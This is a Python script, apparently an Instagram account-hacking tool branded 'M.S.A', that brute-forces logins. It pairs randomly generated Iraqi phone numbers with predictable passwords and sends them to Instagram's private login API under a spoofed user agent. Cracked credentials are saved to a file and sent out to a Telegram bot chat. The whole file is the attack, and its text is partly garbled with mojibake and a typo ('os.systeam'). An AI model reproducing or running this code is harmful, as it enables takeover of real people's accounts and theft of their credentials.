import os
try:
    import uuid
except:
    os.system('pip install uuid')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')

try:
    import time
except:
    os.system('pip install time')
else:
    os.system('clear')
    try:
        import pyfiglet
    except:
        os.system('pip install pyfiglet')
    else:
        os.system('clear')
        import pyfiglet, os
        from time import sleep
        import webbrowser
        Z = '\x1b[2;31m'
        G = '\x1b[1;32m'
        sleep(1)
        bnar = pyfiglet.figlet_format('M . S . A')
        print(G + bnar)
        sleep(1)
        import random, uuid, requests, string
        from user_agent import generate_user_agent
        from datetime import datetime
        from random import *
        from time import sleep
        import requests, os, random, json, threading, secrets, uuid
        from colorama import Fore, Style
        from time import sleep
        from datetime import datetime
        from secrets import token_hex
        from uuid import uuid4
        from user_agent import generate_user_agent
        from uuid import uuid4
        aa = 0
        zz = 0
        E = '\x1b[1;31m'
        G = '\x1b[1;32m'
        S = '\x1b[1;33m'
        webbrowser.open('https://t.me/sq21c')
        print(E + '[' + S + '!' + E + ']' + G + ' IDπ­ ')
        print('\n')
        ID = input(S + '  πΈπππΈπ πππ β   ')
        print('\n')
        sleep(2)
        token = input('  Eπ‘π§ππ₯ Yπ’π¨π₯ Tπ’πππ‘ Bπ’π§ β ')
        w = 'https://pastebin.com/raw/xPfV5eKD'
        start_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=@SQ21C").json()
        id_msg = start_msg['result']['message_id']
        rss = requests.get(w).text
        if 'M.S.A' in rss:
            sleep(0.1)
        r = requests.Session()
        user = '0987654321'
        while True:
            us = str(''.join((random.choice(user) for i in range(7))))
            username = '+964751' + us
            password = '0751' + us
            url = 'https://i.instagram.com/api/v1/accounts/login/'
            headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
             'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip, deflate', 
             'Accept-Language':'en-US', 
             'X-IG-Capabilities':'3brTvw==', 
             'X-IG-Connection-Type':'WIFI', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
            uid = str(uuid4())
            data = {'uuid':uid, 
             'password':password, 
             'username':username, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
            req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
            if 'logged_in_user' in req_login.text:
                zz += 1
                print(G + 'username ==> : ' + username + ': password ==> : ' + password)
                tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=ΨͺΨΉΨ§Ω Ψ­Ψ¨ΩΨ΅Ω Ψ¬Ψ¨ΨͺΩΩ Ψ­Ψ³Ψ§Ψ¨ ποΏ½οΏ½οΏ½οΏ½.\n\n πΌπΊπ¬πΉπ΅π¨π΄π¬ : {username}\n π·π¨πΊπΊπΎπΆπΉπ« : {password}\n- Dev : @SQ21C"
                i = requests.post(tlg)
                with open('insta.txt', 'a') as (HACKED):
                    HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
            elif '"message":"challenge_required","challenge"' in req_login.text:
                print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
            else:
                requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= - -  Ψ§Ψ―Ψ§Ψ© M.S.A ΩΨ΅ΩΨ― Ψ§ΩΨ­Ψ³Ψ§Ψ¨Ψ§Ψͺ   @SQ21C\n  β [{zz}] \n------------------------------------------\n  β[{aa}]  ( {username} ) \n Dev β  @SQ21C")
                print(E + 'username ==> : ' + username + ': password ==> : ' + password)
                aa += 1

        print('Ψ±Ψ§Ψ³Ω Ψ§ΩΩΨ·ΩΨ± ')
        print('ΩΨΉΨ±Ω Ψ§ΩΩΨ·ΩΨ±ΩΩ')
        print('@SQ21C')
